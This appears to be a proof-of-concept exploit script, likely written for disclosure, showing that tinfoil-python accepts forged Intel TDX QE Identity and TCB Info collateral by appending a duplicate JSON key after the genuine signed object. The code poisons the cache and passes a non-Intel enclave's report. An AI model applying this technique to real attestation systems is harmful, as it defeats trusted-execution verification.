"""
PoC 1 -- tinfoil-python accepts forged Intel TDX collateral (QE Identity /
TCB Info) via a duplicate-key JSON parser differential.

Uses REAL Intel-signed PCS collateral (google/go-tdx-guest v0.3.1 testdata:
QE Identity v2, TCB Info v3 for FMSPC 50806f000000, and the genuine
"Intel SGX TCB Signing" issuer chain that PCS returns in the response header).

Nothing in tinfoil's verification code is patched. Two environment knobs only:
  * the clock is frozen to 2023-06-30 (inside the validity window of this
    captured collateral and of the TCB Signing certificate), and
  * requests.get is replaced by a stub playing the role of the collateral
    delivery path (https://tdx-proxy.tinfoil.sh/...), which is the attacker.
"""
import copy
import datetime as _dt
import json
import os
import sys
import tempfile
from unittest import mock

import requests

import tinfoil.attestation.cert_utils as cu
import tinfoil.attestation.collateral_tdx as ct

HERE = os.path.dirname(os.path.abspath(__file__))
DATA = os.path.join(HERE, "data")
FROZEN = _dt.datetime(2023, 6, 30, tzinfo=_dt.timezone.utc)


class FrozenDateTime(_dt.datetime):
    @classmethod
    def now(cls, tz=None):
        return FROZEN.astimezone(tz) if tz else FROZEN.replace(tzinfo=None)


cu.datetime = FrozenDateTime
ct.datetime = FrozenDateTime


def read(name, mode="rb"):
    with open(os.path.join(DATA, name), mode) as f:
        return f.read()


def ok(msg):
    print(f"  [ACCEPTED] {msg}")


def rejected(msg, e):
    print(f"  [REJECTED] {msg}: {type(e).__name__}: {str(e)[:110]}")


GENUINE_QE = read("qe_identity.json").rstrip()
GENUINE_TCB = read("tcb_info.json").rstrip()
QE_CHAIN_HDR = read("qeIdentityIssuerChain.txt", "r").strip()
TCB_CHAIN_HDR = read("tcbInfoIssuerChain.txt", "r").strip()

INTEL_TD_QE_MRSIGNER = "DC9E2A7C6F948F17474E34A7FC43ED030F7C1563F1BABDDF6340C82E0E54A8C5"
ATTACKER_MRSIGNER = "41" * 32  # MRSIGNER of an enclave signed with the attacker's key


def append_duplicate(genuine: bytes, key: str, forged_obj: dict) -> bytes:
    """Append a second top-level `key` member after the genuine signed one."""
    assert genuine.endswith(b"}")
    return (
        genuine[:-1]
        + b',"' + key.encode() + b'":'
        + json.dumps(forged_obj, separators=(",", ":")).encode()
        + b"}"
    )


def fake_proxy(body: bytes, header_name: str, header_value: str):
    """requests.get replacement: the collateral delivery path returns `body`."""
    seen = []

    def _get(url, timeout=None, **kwargs):
        seen.append(url)
        r = requests.Response()
        r.status_code = 200
        r._content = body
        r.headers[header_name] = header_value
        r.url = url
        return r

    return _get, seen


def main() -> int:
    chain = ct._parse_issuer_chain_header(QE_CHAIN_HDR)
    print("QE Identity issuer chain (from genuine PCS header):")
    for c in chain:
        print("   -", c.subject.rfc4514_string())

    # ------------------------------------------------------------------
    print("\n[1] Baseline: genuine Intel QE Identity")
    parsed = ct.parse_qe_identity_response(GENUINE_QE)
    ct.verify_qe_identity_signature(GENUINE_QE, parsed, chain)
    ok(f"signature valid, mrsigner={parsed.enclave_identity.mrsigner.hex()}")

    # ------------------------------------------------------------------
    print("\n[2] Control: in-place tampering of mrsigner is detected")
    tampered = GENUINE_QE.replace(INTEL_TD_QE_MRSIGNER.encode(), ATTACKER_MRSIGNER.encode())
    try:
        ct.verify_qe_identity_signature(tampered, ct.parse_qe_identity_response(tampered), chain)
        print("  !! unexpected acceptance")
        return 1
    except ct.CollateralError as e:
        rejected("tampered body", e)

    # ------------------------------------------------------------------
    print("\n[3] Attack: genuine signed object first, forged duplicate key appended")
    forged = copy.deepcopy(json.loads(GENUINE_QE)["enclaveIdentity"])
    forged.update(
        mrsigner=ATTACKER_MRSIGNER,
        isvprodid=7,
        miscselectMask="00000000",
        attributesMask="00000000000000000000000000000000",
        nextUpdate="2099-01-01T00:00:00Z",
        tcbEvaluationDataNumber=99,
        tcbLevels=[{"tcb": {"isvsvn": 0}, "tcbDate": "2023-02-15T00:00:00Z", "tcbStatus": "UpToDate"}],
    )
    malicious_qe = append_duplicate(GENUINE_QE, "enclaveIdentity", forged)
    print("  wire bytes:", malicious_qe[:60], b"...", malicious_qe[-120:])
    parsed = ct.parse_qe_identity_response(malicious_qe)
    ct.verify_qe_identity_signature(malicious_qe, parsed, chain)
    ok(
        "signature check passed; identity actually used: "
        f"mrsigner={parsed.enclave_identity.mrsigner.hex()} isvprodid={parsed.enclave_identity.isv_prod_id} "
        f"tcbEvalNum={parsed.enclave_identity.tcb_evaluation_data_number} nextUpdate={parsed.enclave_identity.next_update}"
    )

    # ------------------------------------------------------------------
    print("\n[4] Full production fetch path fetch_qe_identity() with a malicious proxy response")
    with tempfile.TemporaryDirectory() as cache_dir, mock.patch.object(ct, "_TDX_CACHE_DIR", cache_dir):
        getter, seen = fake_proxy(malicious_qe, "SGX-Enclave-Identity-Issuer-Chain", QE_CHAIN_HDR)
        with mock.patch.object(ct.requests, "get", getter):
            qe, _, _ = ct.fetch_qe_identity()
        print("  fetched from:", seen[0])
        ok(f"fetch_qe_identity() returned mrsigner={qe.enclave_identity.mrsigner.hex()}")

        # Second call: no network at all -> served from the poisoned cache,
        # whose signature is "re-verified" on every hit.
        def no_network(*a, **k):
            raise AssertionError("network must not be used")

        with mock.patch.object(ct.requests, "get", no_network):
            qe2, _, _ = ct.fetch_qe_identity()
        ok(f"cache hit (persistent poisoning) mrsigner={qe2.enclave_identity.mrsigner.hex()}")

    # ------------------------------------------------------------------
    print("\n[5] Consequence: a QE report from a NON-Intel enclave passes validate_qe_identity")
    attacker_qe_report = dict(
        qe_report_isv_svn=1,
        qe_report_mrsigner=bytes.fromhex(ATTACKER_MRSIGNER),
        qe_report_miscselect=b"\x00\x00\x00\x00",
        qe_report_attributes=bytes.fromhex("15000000000000000700000000000000"),
        qe_report_isvprodid=7,
    )
    genuine_identity = ct.parse_qe_identity_response(GENUINE_QE).enclave_identity
    try:
        ct.validate_qe_identity(genuine_identity, **attacker_qe_report)
        print("  !! unexpected acceptance with genuine identity")
        return 1
    except ct.CollateralError as e:
        rejected("with the genuine Intel QE Identity", e)
    lvl = ct.validate_qe_identity(qe.enclave_identity, **attacker_qe_report)
    ok(f"with the forged QE Identity (tcbStatus={lvl.tcb_status.value})")

    # ------------------------------------------------------------------
    print("\n[6] Same differential on TCB Info (fetch_tcb_info)")
    forged_tcb = copy.deepcopy(json.loads(GENUINE_TCB)["tcbInfo"])
    statuses = sorted({lvl["tcbStatus"] for lvl in forged_tcb["tcbLevels"]})
    print("  genuine tcbLevels statuses:", statuses)
    zero = lambda: [{"svn": 0} for _ in range(16)]
    forged_tcb.update(
        nextUpdate="2099-01-01T00:00:00Z",
        tcbEvaluationDataNumber=99,
        tcbLevels=[{
            "tcb": {"sgxtcbcomponents": zero(), "pcesvn": 0, "tdxtcbcomponents": zero()},
            "tcbDate": "2023-02-15T00:00:00Z",
            "tcbStatus": "UpToDate",
        }],
    )
    malicious_tcb = append_duplicate(GENUINE_TCB, "tcbInfo", forged_tcb)
    with tempfile.TemporaryDirectory() as cache_dir, mock.patch.object(ct, "_TDX_CACHE_DIR", cache_dir):
        getter, seen = fake_proxy(malicious_tcb, "TCB-Info-Issuer-Chain", TCB_CHAIN_HDR)
        with mock.patch.object(ct.requests, "get", getter):
            tcb, _, _ = ct.fetch_tcb_info("50806f000000")
    print("  fetched from:", seen[0])
    ok(
        f"fetch_tcb_info() returned tcbEvaluationDataNumber={tcb.tcb_info.tcb_evaluation_data_number}, "
        f"levels={[l.tcb_status.value for l in tcb.tcb_info.tcb_levels]}, "
        f"level0 svns all zero={all(c.svn == 0 for c in tcb.tcb_info.tcb_levels[0].tcb.sgx_tcb_components)}"
    )
    print("\nRESULT: forged collateral accepted with genuine Intel signatures")
    return 0


if __name__ == "__main__":
    sys.exit(main())
